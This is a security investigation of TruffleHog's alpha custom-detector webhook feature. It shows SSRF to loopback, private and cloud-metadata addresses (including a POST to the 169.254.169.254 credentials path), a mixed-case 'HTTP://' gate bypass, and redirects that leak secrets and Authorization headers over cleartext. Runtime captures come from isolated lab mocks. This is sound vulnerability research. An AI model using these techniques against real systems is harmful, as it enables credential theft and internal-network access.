# TruffleHog Custom-Detector Verification (Webhook) — Security Investigation

**Subject:** the custom regex-detector *verification* (webhook) feature of TruffleHog.
**Commit under test:** `e42153d44a5e5c37c1bd0c70e074781e9edcb760`.
**Binary:** built from this commit with `CGO_ENABLED=0 go build` (Go 1.24.2) to a path **outside** the repository checkout, invoked **only** through its canonical CLI entry point `trufflehog filesystem --config=<yaml> <target>` — never a debug hook, internal-API mock, or synthetic bypass.
**Method:** every behavioral claim below was produced by **running** that binary against crafted configs/targets while local, threaded, loopback-bound mock HTTP/HTTPS servers captured the real requests (method, path, headers, body, count) or via wall-clock timing. Each quantitative result was reproduced across **≥ 2 runs**. All lab artifacts lived outside the repository and were deleted afterward; the source tree is byte-for-byte unchanged (verified with `git status`).
**Labeling (provenance).** Every claim is tagged:
- **[OBSERVED]** — confirmed at runtime through the canonical entry point, with the captured output shown.
- **[INFERRED]** — derived from reading the source at the frozen commit; not directly exercised (or not directly observable) at runtime.
- **[CORROBORATED]** — an inferred mechanism that a runtime observation independently supports.

External references (Go, AWS, OWASP) used to benchmark observed behavior against documented expectations are listed in the final **External references** section; source `file:line` citations point at the frozen commit.

> **Feature status (alpha).** This analysis reflects an **alpha** feature. Per `README.md:L644`: *"NB: This feature is alpha and subject to change."* (`README.md:L628` titles it "Regex Detector (alpha)".) Behavior may change in later releases.

---

## Executive verdict

A party who controls a custom-detector configuration (the YAML passed to `--config`) wields meaningful, and in several respects unbounded, power over the verification subsystem. The table summarizes what was **observed**; each row links to the detailed section that shows the captured output, the responsible `file:line`, and the reproduction.

| # | Question | Verdict (observed) |
|---|----------|--------------------|
| **Q1** | SSRF to internal / metadata (e.g. `169.254.169.254`) | **No destination validation.** The only endpoint checks are non-empty and a **case-sensitive** `http://`-requires-`unsafe` gate; there is **no** allowlist/blocklist, reserved-range, or DNS check. Loopback, RFC1918 private, and the exact `169.254.169.254` endpoint are all dispatched to. On an **exact HTTP 200** the full body is read into memory and the first **200 bytes** (not characters) are echoed into `ExtraData["response"]` → a **semi-in-band SSRF read** primitive. A mixed-case scheme (`HTTP://`) **bypasses** even the `unsafe` gate. (A fixed `POST` will **not** lift credentials from a modern **IMDSv2** endpoint, which requires a `PUT`-token then `GET`.) |
| **Q2** | TLS certificate validation / MITM | **Validation is ON by default** (Go `crypto/tls` system-CA chain **and** hostname/SAN check). A self-signed or wrong-host certificate is **rejected before any HTTP request is sent**; the `unsafe` flag **does not** disable TLS validation. Qualifiers: there is **no certificate pinning** (any CA in the host store — incl. an installed corporate/MITM root — is accepted), and a config-controlled **`307`/`308` redirect to `http://` downgrades the secret onto cleartext**. |
| **Q3** | Verification multiplicity / rate limit | **Not "once."** One request **per permutation** = one selection from the **Cartesian product** of per-named-regex match lists **within a span**, clamped by `maxTotalMatches = 100` **per span (per `FromData`)** — **not** a global cap. A file has many spans across one or more chunks, so total requests are **unbounded by 100** (observed **200** and **500** from single files), further **×M verifiers**, dispatched **concurrently with no `SetLimit` and no throttle/delay**. A default-on **verification cache** can suppress duplicates; and a permutation-count **integer overflow** lets a declarative config **hang the scan indefinitely** (config-DoS). |
| **Q4** | Data sent to the webhook | A **`POST`** with a JSON body `{"<DetectorName>":{"<regexName>":["<submatch>",…]}}` (**the matched secret**, plus capture group if present); **each configured header — normalized, not verbatim** (split on first colon, value left-trimmed, key canonicalized, duplicates appended); and a **`User-Agent`** (`TruffleHog` by default, `TruffleHog <suffix>` with `--user-agent-suffix`, or **fully overridden** by a config `User-Agent` header). **No `Content-Type`.** `SuccessRanges` is parsed but **never applied** (only `== 200` verifies). |
| **Q5** | ReDoS / regex safety | **Structurally safe against catastrophic backtracking.** Custom patterns are compiled/executed with **Go's standard-library `regexp`** — RE2 *syntax* and RE2's **linear-time** guarantee, **no backtracking, no backreferences** (it is Go's own pure-Go engine, **not** a separately linked C++ RE2 library). Timing stays flat under a classic "evil" pattern; a backreference is rejected at config load. The **10 s timeout and `MaxSecretSize` bound the input, not the match** — the safety is the engine. |
| **Q6** | Overall threat model | A config author **can** exfiltrate matched secrets + arbitrary static headers (Q4), use TruffleHog as an **SSRF proxy** into loopback/private/link-local/metadata services with **200-byte** response readback (Q1), **burst up to 100 concurrent unthrottled requests per span** and drive a file well past 100 (Q3), and **wedge a scan indefinitely** with an overflow config (Q3/C8). They **cannot** trivially MITM TLS on the direct hop without a host-trusted cert (Q2) or trigger ReDoS (Q5). |

### The verification pipeline (config → detect → verify)

```mermaid
flowchart TD
    A["trufflehog filesystem --config=&lt;yaml&gt;<br/>main.go config.Read (L463)"] --> B["config.NewYAML: protoyaml.UnmarshalStrict<br/>pkg/config/config.go L27-L36"]
    B --> C["NewWebhookCustomRegex → validate<br/>ValidateVerifyEndpoint: scheme-only, case-sensitive http:// gate (validation.go L35-L44)"]
    C --> D["Engine.detectChunk: iterate spans; FromData called ONCE PER SPAN<br/>ctx = WithTimeout(10s) engine.go L1058-L1070"]
    D --> CACHE{"verification cache (default ON)<br/>all results already cached?<br/>verification_cache.go L69-L133"}
    CACHE -->|"yes (all-hit)"| SUPP["span suppressed: 0 HTTP requests"]
    CACHE -->|"no (any-miss)"| E["CustomRegexWebhook.FromData (per span)<br/>custom_detectors.go L64"]
    E --> F["regexp.Compile + FindAllStringSubmatch<br/>Go stdlib regexp (RE2 syntax, linear-time) L92, L97"]
    F --> G["permutateMatches → productIndices<br/>count = product of matches per named regex, clamped to maxTotalMatches=100 PER SPAN (not global)<br/>L110, L288-L299"]
    G --> H["errgroup: one goroutine per permutation, NO SetLimit (unbounded concurrency)<br/>L112, L155-L161"]
    H --> I["createResults: loop verify[] until first exact-200<br/>POST JSON body + normalized headers + User-Agent<br/>via SaneHttpClient system-CA TLS (L62) → L214-L240"]
    I --> J{"HTTP status == 200 (exact)?"}
    J -->|"yes"| K["Verified=true set BEFORE io.ReadAll (full body read);<br/>store first 200 BYTES in ExtraData[&quot;response&quot;] L249-L266"]
    J -->|"no / network error"| L["continue to next verifier; result stays unverified L242, L272-L276"]
    G -.->|"if product overflows int64 → negative → cap bypassed → make() panics → wgDoneFn skipped"| X["config-DoS: scan HANGS (Q3/C8)<br/>custom_detectors.go L288-L299; engine.go L1049,L1123"]
```

---

## Q1 — SSRF: internal addresses & cloud metadata (`169.254.169.254`)

**User question:** *"If a detector config points to an internal address or cloud metadata endpoint (e.g., 169.254.169.254), what actually happens? Is there validation preventing this?"*

### Direct answer — **[OBSERVED]**
**There is NO destination validation.** The only endpoint checks are (1) the endpoint must be non-empty and (2) an endpoint whose scheme is the lowercase literal `http://` requires `unsafe: true`. There is **no allowlist/blocklist, no reserved-range (loopback/RFC1918/link-local) check, and no DNS-resolution guard**. Consequently a config can point the verifier at **loopback**, an **RFC1918 private** address, or the **`169.254.169.254`** link-local cloud-metadata address, and TruffleHog dispatches the request. On an **exact HTTP 200** the response body is read **in full into memory** and then a **200-byte** (not 200-character) prefix is echoed into the scan result's `ExtraData["response"]`, giving a **semi-in-band SSRF read** primitive. Two important limits: the readback appears only for results that are actually **emitted** (a verified, non-filtered result) and only on a **cache miss** (Q3); and because the request is a fixed **`POST`**, it will not, by itself, retrieve credentials from a modern **IMDSv2** endpoint (which requires a `PUT` token then a `GET`).

### Mechanism (cause → effect) — **[INFERRED from source, corroborated by the runs below]**
- Sole endpoint validator `ValidateVerifyEndpoint` — `pkg/custom_detectors/validation.go:L35-L44`: checks `len(endpoint)==0` and `strings.HasPrefix(endpoint, "http://") && !unsafe`. It inspects only length and the **case-sensitive** `http://` prefix — never the host/IP. No `net.ParseIP`, no CIDR check, no DNS resolution exists in this path.
- Because the prefix check is case-sensitive, an endpoint written `HTTP://…` (or any mixed case) **bypasses** the `unsafe` requirement entirely.
- Dispatch: `http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(), …)` (`custom_detectors.go:L228`) then `httpClient.Do(req)` (`:L240`) to the configured URL. Redirects are handled by Go's default `http.Client` policy (up to 10 hops), so the **final** destination can differ from the configured one.
- Readback: on `resp.StatusCode == http.StatusOK` (**exactly 200**) `result.Verified = true` is set **before** `body, _ := io.ReadAll(resp.Body)` reads the **entire** body; then `responseStr := string(body); if len(responseStr) > 200 { responseStr = responseStr[:200] }` stores a **200-byte** prefix in `ExtraData["response"]` — `custom_detectors.go:L249-L266`.

### Observed output

**Q1.a — loopback dispatch + 200-BYTE readback truncation (2 runs identical).** Mock returns a 325-byte body:
```
$ /tmp/lab/th filesystem --no-update --json --config=repro_q1.yaml repro_q1.txt     # run 1 and run 2
Verified=True echoed_len=200 (server sent 325)
# request captured at mock: method=POST path=/ body={"LoopbackSSRF":{"theToken":["labtok_aaa111"]}}
```

**Q1.b — the `[:200]` truncation is BYTE-indexed, and an unaligned split emits `U+FFFD` (2 runs each).** Two sub-cases isolate the exact behaviour of the truncation at `custom_detectors.go:L262` (`responseStr = responseStr[:200]`).

*Sub-case b-1 — aligned split (clean multi-byte boundary) [OBSERVED].* Mock returns 150 × `U+00E9` (2 bytes each = 300 bytes); byte 200 falls exactly between two characters:
```
echoed_response: char_len=100 utf8_byte_len=200 ends_U+FFFD=False   (server sent 300 bytes = 150 chars)
```
The echoed value is 200 **bytes** (= 100 two-byte characters), confirming the slice is byte-indexed, not rune-indexed.

*Sub-case b-2 — unaligned split (a multi-byte character straddles byte 200) [OBSERVED + INFERRED]* — this is the corner case where the byte slice cuts a character in half. Mock returns 199 × `A` + one `U+00E9` (`0xC3 0xA9`) = **201 bytes**, so `[:200]` keeps the 199 `A`s plus the **dangling first byte `0xC3`** (an invalid UTF-8 string):
```
run 1 / run 2: Verified=True char_len=200 utf8_byte_len=202 ends_U+FFFD=True
               last_char_codepoint=U+FFFD is_FFFD=True first10='AAAAAAAAAA'
```
Cause→effect: TruffleHog stores the raw 200-**byte** slice internally, but when that string is serialised to JSON the Go **`encoding/json`** encoder coerces the invalid trailing byte into the Unicode replacement character **`U+FFFD`** (3 bytes `EF BF BD`). The emitted result therefore carries 200 *characters* (199 `A` + one `U+FFFD`) occupying **202 bytes**. The `U+FFFD` terminus is **[OBSERVED]** at runtime as the signature of a mid-character byte cut; that the substitution is performed by Go's JSON encoder (rather than stored that way) is **[INFERRED]** from Go's documented UTF-8 coercion in `encoding/json`.

**Q1.c — RFC1918 private address `10.236.7.63` (the container's own private IP).** The POST reaches an internal service with the secret and an attacker probe header:
```
✅ Found verified result 🐷🔑
# captured at the private address 10.236.7.63:18142 :
{"seq": 1, "method": "POST", "path": "/internal/admin", "ua": "TruffleHog", "auth": null, "content_type": null, "ua_all": ["TruffleHog"], "headers": [["Host", "10.236.7.63:18142"], ["User-Agent", "TruffleHog"], ["Content-Length", "46"], ["X-Probe", "internal"], ["Accept-Encoding", "gzip"]], "body": "{\"PrivateSSRF\":{\"theToken\":[\"labtok_ccc333\"]}}"}
```

**Q1.d — mixed-case scheme bypass.** Endpoint `HTTP://127.0.0.1:18143/bypass` with **no** `unsafe` — the config loads and the plaintext request is dispatched anyway:
```
✅ Found verified result 🐷🔑
mock received (bypass proof) = 1 request(s):
{"method": "POST", "path": "/bypass", "ua": "TruffleHog", "body": "{\"MixedCaseBypass\":{\"theToken\":[\"labtok_ddd444\"]}}"}
```

**Q1.e — the only validation that exists (scheme/empty), shown by contrast:**
```
# http:// (lowercase) WITHOUT unsafe:
error parsing the provided configuration file  {"error": "http endpoint must have unsafe=true"}
# empty endpoint:
error parsing the provided configuration file  {"error": "no endpoint"}
```

**Q1.f — the user's exact example `169.254.169.254`.** Two independent, safe observations:

*(f-1) Config accepted, no destination-validation error* — run with `--no-verification` so **no packet is sent**:
```
$ /tmp/lab/th filesystem --no-update --no-verification --config=q15.yaml q15.txt
Found unverified result 🐷🔑❓          # loads and scans; NO validation error for the 169.254.169.254 endpoint
```

*(f-2) Dispatch to the exact address, proven under a FAIL-CLOSED harness that is PHYSICALLY unable to reach real IMDS [OBSERVED, 2 runs].* The dispatch is proven inside an **isolated Linux network namespace** (`labns`) that has **no default route** and holds only a local `169.254.169.254/32` on `lo`, so a packet to the metadata IP can **only** reach a synthetic fake bound inside that namespace — the real cloud metadata service is unreachable *by construction*, not by a filter rule that could fail open. Before TruffleHog is started, a **hard isolation gate** runs two probes and `exit`s the script (`set -euo pipefail`) unless BOTH fail: (i) the namespace must contain no `default` route, and (ii) an external-IP probe (`curl http://8.8.8.8/`) must be **unreachable**. Only after the gate passes is the synthetic fake started and TruffleHog invoked *inside* the namespace via the canonical CLI:
```
=== isolation gate PASSED: no default route; external IP unreachable ===
=== trufflehog run 1 (inside isolated netns, canonical CLI) ===
  Verified=True
  echoed_response(len=200): {"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"FAKE-SYNTHETIC-LAB-ONLY-AKIA0000","SecretAccessKey":"FAKE-SYNTHETIC-LAB-ONLY-DO-NOT-USE-000000000000","Token":"FAKE-SYNTHETIC-SESSION-TOKEN-LAB-ONLY-
=== trufflehog run 2 (inside isolated netns, canonical CLI) ===
  Verified=True
  echoed_response(len=200): {"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"FAKE-SYNTHETIC-LAB-ONLY-AKIA0000","SecretAccessKey":"FAKE-SYNTHETIC-LAB-ONLY-DO-NOT-USE-000000000000","Token":"FAKE-SYNTHETIC-SESSION-TOKEN-LAB-ONLY-
=== request(s) captured at the SYNTHETIC fake standing in for 169.254.169.254 ===
  {"method": "POST", "path": "/latest/meta-data/iam/security-credentials/", "ua": "TruffleHog", "metadata_hdr": "true", "body": "{\"MetadataSSRFDetector\":{\"theToken\":[\"labtok_aaa111\"]}}"}
  {"method": "POST", "path": "/latest/meta-data/iam/security-credentials/", "ua": "TruffleHog", "metadata_hdr": "true", "body": "{\"MetadataSSRFDetector\":{\"theToken\":[\"labtok_aaa111\"]}}"}
```
TruffleHog dispatched `POST /latest/meta-data/iam/security-credentials/` with the `Metadata: true` header and the secret body to `169.254.169.254`, and echoed 200 bytes of the (synthetic) response, **identically across both runs**. **No real metadata service was, or could be, contacted** — the namespace has no route off-host (proven by the isolation gate), and the synthetic body is clearly labelled `FAKE-SYNTHETIC-LAB-ONLY`. This disconnected-namespace design is *fail-closed by construction*: if any setup step fails, `set -euo pipefail` aborts the script before TruffleHog runs, and there is no path from the namespace to the real `169.254.169.254`. (The full harness is in the Appendix as `run_q1_metadata_netns.sh`.)

**Q1.g — IPv6 loopback `[::1]` is dispatched to as well (2 runs) [OBSERVED].** The absence of destination validation is address-family-agnostic: an endpoint of `http://[::1]:<port>/v6` reaches an IPv6 loopback listener exactly as the IPv4 cases do:
```
run 1 / run 2: Found verified result (1 each)
# captured at the [::1] mock:
{"method": "POST", "path": "/v6", "ua": "TruffleHog", "headers": [["Host", "[::1]:18150"], ...], "body": "{\"IPv6SSRF\":{\"theToken\":[\"labtok_ggg777\"]}}"}
```
Cause→effect: `ValidateVerifyEndpoint` never parses the host, so the IPv6 literal passes the same scheme/empty gate and Go's dialer connects to `[::1]`. (Harness note: IPv6 on the container's `lo` was enabled with `sysctl -w net.ipv6.conf.lo.disable_ipv6=0` so `[::1]` is bindable; this is a *lab* prerequisite for the listener, not a TruffleHog setting — the dispatch behaviour under test is unaffected.)

> **[INFERRED / CORROBORATED]** (a) The full body is read into memory before the 200-byte slice, so a large or `gzip`-inflated response is a memory-amplification risk (`io.ReadAll` at `custom_detectors.go:L253`). (b) Because the request is a fixed `POST`, it would **not** retrieve credentials from a modern **IMDSv2** endpoint, which requires a `PUT /latest/api/token` then a token-bearing `GET` (AWS IMDS docs); the dispatch and readback primitive is real, but "AWS credential theft" is not turnkey against IMDSv2. (c) DNS resolution and DNS-rebinding are not guarded; a hostname endpoint is resolved by Go with no pre-dispatch validation.

### Reproduction
1. Start the plaintext mock (Appendix) on `127.0.0.1:<port>` returning a >200-byte body; write a detector config with `verify.endpoint: http://127.0.0.1:<port>/` and `unsafe: true`.
2. `trufflehog filesystem --no-update --json --config=<cfg> <target>` → observe `Verified=True` and a 200-byte `ExtraData["response"]`.
3. Repeat with the endpoint set to an RFC1918 address (mock bound to that address), an IPv6 `[::1]` address, and — for the exact metadata address — only inside the **disconnected network namespace** harness (`run_q1_metadata_netns.sh`, Appendix), whose isolation gate aborts unless the namespace is provably off-network (never against a live metadata service).

---

## Q2 — TLS certificate validation / man-in-the-middle

**User question:** *"When verification requests are made over HTTPS, what certificate validation does TruffleHog perform? Could a network-path attacker intercept the traffic?"*

**Direct answer — [OBSERVED]** (the redirect/proxy header-forwarding rules are OBSERVED at runtime and corroborated by Go's documented redirect semantics). Over HTTPS the webhook performs **full, standard TLS verification** — Go's `crypto/tls` defaults: the server chain is validated against the **host's system CA store** *and* the hostname/SAN is checked. The `unsafe` flag does **not** weaken this (it governs only the `http://` scheme gate). Therefore a passive or active network-path attacker **cannot** intercept HTTPS verification on the direct hop **unless they already hold a certificate that chains to a CA in the host's trust store (or have compromised that store)**. Three important qualifiers below the headline: (1) there is **no certificate pinning** for webhooks, so *any* CA the host trusts — including a corporate/MITM interception CA — is accepted; (2) TruffleHog **follows HTTP redirects**, and a `307`/`308` from the configured HTTPS endpoint to an `http://` URL causes the **secret (and any configured `Authorization` header) to be re-sent over cleartext** — while `301`/`302`/`303` drop the body (POST→GET) but still resend `Authorization` over cleartext to the same host — an attacker-triggerable downgrade that a config author controls; and (3) when the host sets `HTTP(S)_PROXY`, the verification request (full secret body **and** `Authorization`) is forwarded to that proxy, and a `Proxy-Authorization` header — unlike `Authorization` — is **retained across a cross-origin redirect** (Go issue GO-2025-3751), an additional cleartext-exposure surface.

All results below use a threaded HTTPS mock that counts **app-layer requests** (handshake completed) separately from **TLS handshake failures**; each case run twice.

### Condition A — self-signed (untrusted) cert: rejected before any request; `unsafe` makes no difference [OBSERVED]

Command: `/tmp/lab/th filesystem --no-update --no-verification-cache --config=<cfg> --json tgt.txt`, endpoint `https://127.0.0.1:PORT/verify`, server presents the self-signed cert (`ss.crt`), **no** `SSL_CERT_FILE`. Two configs: `unsafe: false` and `unsafe: true`.

```
[unsafe=false] run1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[unsafe=false] run2 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[unsafe=true ] run1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[unsafe=true ] run2 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
```

Cause→effect: the client aborts the handshake (the server observes the client's `bad_certificate` alert) and **no HTTP request is ever sent** (`app_layer=0`); the result is unverified. `unsafe:true` is byte-for-byte identical — it does not touch TLS.

### Condition B — trusted CA + correct SAN (`IP:127.0.0.1`): handshake succeeds, request delivered, verified [OBSERVED]

A private CA issues a leaf with `subjectAltName=IP:127.0.0.1`; the server presents `leaf+CA`; the run injects that CA via `SSL_CERT_FILE=ca.crt`.

```
[trusted, correct SAN] run1 verified=1  {"app_layer": 1, "handshake_errors": 0, "last_error": null}
[trusted, correct SAN] run2 verified=1  {"app_layer": 1, "handshake_errors": 0, "last_error": null}
```

Human output: `✅ Found verified result … Response: OK … verified_secrets: 1`. App-layer log confirms the delivered body: `POST /verify {"TlsDetector":{"theToken":["labtok_tls001"]}}`. Cause→effect: a chain to a trusted root **and** a matching host allows the handshake, the POST is delivered, the `200` verifies. (This shows what an attacker must obtain to intercept: a host-trusted certificate for the target host.)

### Condition C — trusted CA + WRONG SAN (`wrong.example.com`): rejected on hostname check [OBSERVED]

Same CA (trusted via `SSL_CERT_FILE`), but the leaf's SAN is `DNS:wrong.example.com` while the endpoint host is `127.0.0.1`.

```
[trusted, wrong SAN] run1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[trusted, wrong SAN] run2 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
```

Cause→effect: chain validation passes but **hostname/SAN verification fails**, the client aborts, `app_layer=0`, unverified. This isolates hostname checking as active — a valid-but-wrong-host cert is not accepted. (Go's specific client-side error for this case is `x509: certificate is valid for wrong.example.com, not 127.0.0.1` [INFERRED from Go `crypto/x509`; the OBSERVED signal is the handshake abort above].)

### Condition D — HTTPS→HTTP redirect downgrade: secret re-sent over cleartext on 307/308 [OBSERVED]

A **trusted** HTTPS endpoint (P1) answers with a 3xx `Location: http://127.0.0.1:P2/leak` (plaintext). Config also sets `headers: ['Authorization: Bearer SECRET-BEARER-TOKEN']`. The full redirect matrix (what actually arrives at the plaintext P2 hop) was captured for all five redirect codes:

```
[301] https_P1=1 plaintext_P2=1  P2_method=GET   P2_auth=Bearer SECRET-BEARER-TOKEN  P2_body=
[302] https_P1=1 plaintext_P2=1  P2_method=GET   P2_auth=Bearer SECRET-BEARER-TOKEN  P2_body=
[303] https_P1=1 plaintext_P2=1  P2_method=GET   P2_auth=Bearer SECRET-BEARER-TOKEN  P2_body=
[307] https_P1=1 plaintext_P2=1  P2_method=POST  P2_auth=Bearer SECRET-BEARER-TOKEN  P2_body={"RedirDetector":{"theToken":["labtok_redir1"]}}
[308] https_P1=1 plaintext_P2=1  P2_method=POST  P2_auth=Bearer SECRET-BEARER-TOKEN  P2_body={"RedirDetector":{"theToken":["labtok_redir1"]}}
```

Cause→effect: TruffleHog's client follows redirects (Go default `CheckRedirect`, ≤10 hops). For **`301`/`302`/`303` the body is dropped (POST→GET)** but the `Authorization` header is **still re-sent over cleartext** to the same host — so even a body-dropping redirect leaks the static bearer token. For **`307`/`308` the full body (the matched secret) *and* the `Authorization` header are re-transmitted over cleartext HTTP** — the worst case, where a network attacker on that hop reads the secret itself. All five rows are **[OBSERVED]** at the P2 mock; the same-host `Authorization` retention matches Go's documented rule (retained on a same-host scheme change, stripped cross-domain — see External references). The cross-origin body-only re-send (with `Authorization` stripped) is exercised under Condition F below.

### Condition E — expired certificate (trusted CA, correct SAN, `notAfter` in the past): rejected [OBSERVED]

Completeness demands the *time-validity* branch of chain verification, not just trust and hostname. A leaf signed by the trusted lab CA with the correct `IP:127.0.0.1` SAN but an expiry date in the past is presented (2 runs):
```
[trusted,EXPIRED] run 1 verified=0  {"app_layer": 0, "handshake_errors": 1, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
[trusted,EXPIRED] run 2 verified=0  {"app_layer": 0, "handshake_errors": 2, "last_error": "[SSL: SSLV3_ALERT_BAD_CERTIFICATE] ssl/tls alert bad certificate (_ssl.c:1033)"}
```
Cause→effect: even though the chain is trusted and the SAN matches, Go's `crypto/x509` rejects an expired certificate during verification; the client sends the `bad certificate` alert and no application-layer request is made (`app_layer=0`). This confirms the standard `NotAfter` check is active — the webhook does not accept stale certificates.

### Condition F — proxy forwarding and the cross-origin `Proxy-Authorization` retention (GO-2025-3751) [OBSERVED]

`saneTransport` honours `http.ProxyFromEnvironment`, so a host-set `HTTP(S)_PROXY` routes the webhook request through the proxy in absolute-form — carrying the full secret body and any configured `Authorization` (2 runs):
```
run 1 proxy captured: method=POST path=http://internal.example.test/collect auth=Bearer PROXY-LEAK-SECRET body={"ProxyDetector":{"theToken":["labtok_prox01"]}}
run 2 proxy captured: method=POST path=http://internal.example.test/collect auth=Bearer PROXY-LEAK-SECRET body={"ProxyDetector":{"theToken":["labtok_prox01"]}}
```
Separately, the **cross-origin redirect** header rule (Go security issue GO-2025-3751) was exercised: P1 (`127.0.0.1`) issues a `307` to P2 on the container's **private IP** (a *different* host = cross-origin), with the config supplying both an `Authorization` and a `Proxy-Authorization` header (2 runs):
```
run 1 P2(cross-origin) received: method=POST auth=None proxy_auth=Basic UFJPWFktQVVUSA==
run 2 P2(cross-origin) received: method=POST auth=None proxy_auth=Basic UFJPWFktQVVUSA==
# built with go1.24.2;  base64("UFJPWFktQVVUSA==") = "PROXY-AUTH"
```
Cause→effect: on a **cross-origin** hop Go correctly **strips `Authorization`** (`auth=None` above), but — per GO-2025-3751 — the **`Proxy-Authorization` header is *retained*** and re-sent (`proxy_auth=Basic …` survives). So a config author who sets a `Proxy-Authorization` header can have that credential forwarded to an arbitrary cross-origin redirect target; the `POST` body (the matched secret) is likewise re-sent cross-origin under `307`. This is **[OBSERVED]** on go1.24.2, the exact toolchain this binary was built with.

### Mechanism (cause→effect, with citations)

- The webhook client is `common.SaneHttpClient()` [`pkg/custom_detectors/custom_detectors.go:62`]; its `saneTransport` sets **no `TLSClientConfig`** [`pkg/common/http.go:211-221`], so Go applies default system-CA chain + hostname verification. Request timeout 5 s [`pkg/common/http.go:209`].
- `unsafe` is consumed **only** by `ValidateVerifyEndpoint` for the scheme gate [`pkg/custom_detectors/validation.go:35-44`]; it never reaches the TLS layer.
- **No TLS-verification-disabling path is reachable from a custom-detector webhook.** The codebase *does* contain several `InsecureSkipVerify` usages, but none is on the webhook path: `WithInsecureTLS` (`InsecureSkipVerify:true`) [`pkg/roundtripper/roundtripper.go:122-127`] is wired to **source** connectors (e.g. Jenkins [`pkg/sources/jenkins/jenkins.go:81-83`]); the **LDAP detector** sets `tls.Config{InsecureSkipVerify:true}` directly [`pkg/detectors/ldap/ldap.go:151,159`]; and several source configs expose an `InsecureSkipVerifyTls` protobuf field (Jenkins, Confluence, JIRA, Sentry). All of these are outside the custom-detector verification path, which uses `SaneHttpClient` with no `TLSClientConfig`. So while "TruffleHog never disables TLS verification" would be **false** codebase-wide, a **webhook config cannot turn off certificate validation** — the accurate, webhook-scoped claim.
- There is **no certificate pinning** on the webhook path: `PinnedRetryableHttpClient` (pinned ISRG roots) exists [`pkg/common/http.go:159-178`] but the webhook uses `SaneHttpClient`, not it. Any CA in the host store is therefore accepted.
- `saneTransport` uses `Proxy: http.ProxyFromEnvironment` [`pkg/common/http.go:212`], so `HTTP(S)_PROXY` env vars are honored for webhook traffic.

**Scope of "cannot intercept."** Against the *direct* hop, a self-signed, wrong-host, or expired certificate is rejected (Conditions A, C, E), so a naive MITM fails. Interception is possible only if the attacker's certificate chains to a CA the **host already trusts** (e.g., an installed corporate-proxy/MITM root — accepted because there is no pinning), if the config author supplies an endpoint that **downgrades to plaintext via a redirect** (Condition D — `301/302/303` leak `Authorization`; `307/308` leak the full secret body too), or if traffic is routed through a host `HTTP(S)_PROXY` where a `Proxy-Authorization` header survives even a cross-origin redirect (Condition F, GO-2025-3751). The custom regex-detector feature is documented **alpha** [`README.md:644`].

**Coverage:** HTTPS validation performed? **Yes — system-CA chain + hostname + expiry** (A,B,C,E). Could a network attacker intercept? **Not on the direct hop without a host-trusted, in-date cert** (A,C,E); **yes** via an installed/compromised trust root (no pinning), a **redirect plaintext downgrade** the config author can force (D — `Authorization` on `301/302/303`, secret body on `307/308`), or **proxy routing / cross-origin `Proxy-Authorization` retention** (F). `unsafe` effect on TLS? **None** (A).

---

## Q3 — Verification multiplicity and rate limiting

**User question:** *"When a detector has multiple matching patterns in the same file, does it verify once or something more complex? Is there any limit on how many requests can be triggered?"*

**Direct answer — [OBSERVED]** (request counts, cap, and absence of throttling all measured at runtime; the overflow-hang mechanism in C8 is OBSERVED with its stack trace, the integer-overflow cause INFERRED from source). When a detector matches multiple patterns, it does **not** verify "once." It fires **one verification attempt per _permutation_**, where a permutation is one selection from the **Cartesian product** of the per‑named‑regex match lists found **within a single match span**. There **is** a limit, but it is **not** a global cap of 100: `maxTotalMatches = 100` clamps the permutation count **inside one `productIndices` call — i.e. per span (per `FromData` invocation)**, and a single file produces **many** spans (one per keyword region, merged) across **one or more** chunks. Consequently the total number of outbound requests a file can trigger is **unbounded by 100** and is governed by the formula below. There is **no throttling, no inter‑request delay, and no token‑bucket/rate‑limit anywhere** in the path.

**Requests, exactly.** For one span:

```
requests(span) = min( Π_over_named_regexes ( #matches_of_that_regex_in_span ) , 100 )
                 × (verifiers tried per permutation: 1..M, stopping at the first exact-200)
```

and a file emits `Σ over spans over chunks` of that quantity. `M` = number of `verify:` entries.

---

### Condition 1 — single named regex, one span: per-span clamp = `min(N,100)` [OBSERVED]

Command (per N): `/tmp/lab/th filesystem --no-update --no-verification-cache --scan-entire-chunk --config=a.yaml a_$N.txt` (config: 1 detector, regex `theToken: labtok_[a-z0-9]+`, 1 verifier→mock; target: N distinct `labtok_%06d` tokens; `--scan-entire-chunk` forces the whole file into one span; request count = lines in the mock log). Two runs each:

```
  N=5   run=1 requests=5     run=2 requests=5
  N=50  run=1 requests=50    run=2 requests=50
  N=99  run=1 requests=99    run=2 requests=99
  N=100 run=1 requests=100   run=2 requests=100
  N=101 run=1 requests=100   run=2 requests=100
  N=150 run=1 requests=100   run=2 requests=100
```

Mechanism (cause→effect): a single named regex with N in-span matches yields `lengths=[N]`, so `productIndices(N)` returns `min(N,100)` permutations [`pkg/custom_detectors/custom_detectors.go:295-296`]; `FromData` spawns one `errgroup` goroutine per permutation [`custom_detectors.go:112,155`], each running `createResults`, which issues exactly one POST for a single-verifier config. Hence requests = `min(N,100)` **for this span**.

### Condition 2 — two named regexes: the cap is on the PRODUCT, not the sum [OBSERVED]

Command: same as above with config `idpat: idz_[0-9]+` and `keypat: keyz_[a-z]+`; target has `a` distinct `idz_` and `b` distinct `keyz_` tokens.

```
  a=3  b=4  run=1 requests=12    run=2 requests=12    (product=12, sum=7)
